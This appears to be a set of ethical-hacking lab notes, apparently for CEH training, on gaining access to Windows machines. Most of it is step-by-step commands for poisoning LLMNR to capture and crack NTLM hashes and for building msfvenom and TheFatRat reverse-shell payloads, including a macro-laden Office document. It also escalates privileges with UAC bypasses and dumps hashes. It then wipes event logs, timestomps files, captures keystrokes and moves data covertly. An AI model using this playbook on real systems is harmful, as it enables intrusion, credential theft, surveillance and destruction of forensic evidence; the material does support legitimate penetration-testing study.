# System Hacking

## Gain access to the system

### Crack the system’s password using Responder

Responder is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool only responds to a File Server Service request, which is for SMB.

```
cd Responder
chmod +x Responder.py
./Responder.py -I eth0
```
Goto windows machine
open run
type "\\CEH-Tools"
Go back to the linux machine

The logs are by default stored at ~/logs
```
sudo apt install john-the-ripper
sudo john ~/logs/SMB-NTLM
```
The password is now cracked!

### Audit system passwords using L0phtCrack
As an ethical hacker or penetration tester, you can use the L0phtCrack tool for auditing the system passwords of machines in the target network and later enhance network security by implementing a strong password policy for any systems with weak passwords.

* Windows
* Password Auditing Wizard button
* Follow set up steps
* Enter Admin credentials of the target machine

### Find vulnerabilities on exploit sites

https://www.exploit-db.com/

### Exploit client-side vulnerabilities and establish a VNC session

```
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o OutputPath.exe 
service apache2 start
cp OutputPath.exe /var/www/html/share
```
Share the file
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 
set LPORT 444
exploit
```
After gaining access
PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.
```
sysinfo
upload /root/PowerSploit/Privesc/PowerUp.ps1 
shell
powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks” 
exit
run vnc
```

### Gain access to a remote system using Armitage

```
service postgresql start
```
Open armitage Pentesting Tools -> Exploitation -> Metasploit Framework -> armitage
Hosts -> Nmap Scan -> Intense Scan
Payload -> windows -> meterpreter -> meterreter_reverse_tcp -> lport 444 -> output exe -> Launch
Save at any location of choice
Terminal
```
cp source destination
service apache2 start
```
Armitage
double click meterpreter_reverse_tcp -> lport 444 -> Output multi/handler

Let victim click the app

right click on pc -> meterpreter 1 -> interact -> meterpreter shell
```
sysinfo
```
right click on target pc -> Meterpreter 1 --> Explore --> Browse Files.

### Hack a Windows machines with a malicious Office document using TheFatRat

```
fatrat
  [06] Create Fud Backdoor 1000% with PwnWinds [Excelent]
  [3] Create exe file with apache + Powershell (FUD 100%)
  [ 3 ] windows/meterpreter/reverse_tcp
```
generated payload appear and are saved at the location /root/TheFatRat_Generated
```
  [9] Back to Menu 
  [07] Create Backdoor For Office with Microsploit
  |2| The Microsoft Office Macro on Windows
  y
  [ 3 ] windows/meterpreter/reverse_tcp
```
```
cp /root/Fatrat_Generated/BadDoc.docm /var/www/html/share 
service apache2 start
msfconsole
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp 
set LHOST 
set LPORT
exploit
```
```
sysinfo
```


## Privilege Escalation

### 1 Using BeRoot

```
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.13 -f exe > Desktop/Exploit.exe 
```
```
msfconsole
use /exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhosts host
set lport port
exploit
```
Share this file over lan
After gaining access
```
getuid
```
ensure beroot is on desktop or location locally
```
upload pathofbeRoot.exe 
shell
beRoot.exe
exit
```
#### To check if privilege escalation is successful
```
run post/windows/gather/smart_hashdump
```
```
getsystem -t 1
```

```
background
```
### 2 Using bypassuac_fodhelper 

```
use exploit/windows/local/bypassuac_fodhelper
options
set session 1
set payload windows/meterpreter/reverse_tcp
set LHOST 
set target 0
exploit
```
If a meterpreter shell is opened, then the exploit is successful
```
getuid
getsystem -t 1 
getsystem
run post/windows/gather/smart_hashdump 
```
Clearing Logs (Requires admin access)
```
clearev 
```


While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified, accessed, created, entry) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information.
To leave no trace of these MACE attributes, use the timestomp command to change the attributes as you wish after accessing a file.
```
timestomp secret.txt -v 
timestomp secret.txt -m “02/11/2018 08:10:03”
timestomp secret.txt -v
```
download command downloads a file from the remote machine to the host machine.
```
download file
```
search command that helps you to locate files on the target machine. This type of command is capable of searching through the whole system or can be limited to specific folders.
```
search -f fileextension
```
To capture all the keystrokes of target
```
keyscan_start 
keyscan_dump
```
To check idle time of the user
```
idletime
```





## Covert_TCP 

Machine 1
```
mkdir Send
cd Send
echo "Secret" > message.txt
```
```
Places CEH Tools on Windows
if not present - 
Places Network ctrl L smb://10.10.10.10
copy covert_tcp.c and paste it in linux folder
```
To compile
```
cc -o covert_tcp covert_tcp.c
```

Go to other machine 2
```
tcpdump -nvvx port 8888 -i lo
```
Open new terminal
```
cd Desktop
mkdir Recieve
cd Recieve
```
```
Places CEH Tools on Windows
if not present - 
Places Network ctrl L smb://10.10.10.10
copy covert_tcp.c and paste it in linux folder
```
To compile
```
cc -o covert_tcp covert_tcp.c
```
```
 ./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt
```

Goto Machine 1
```
./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt
```
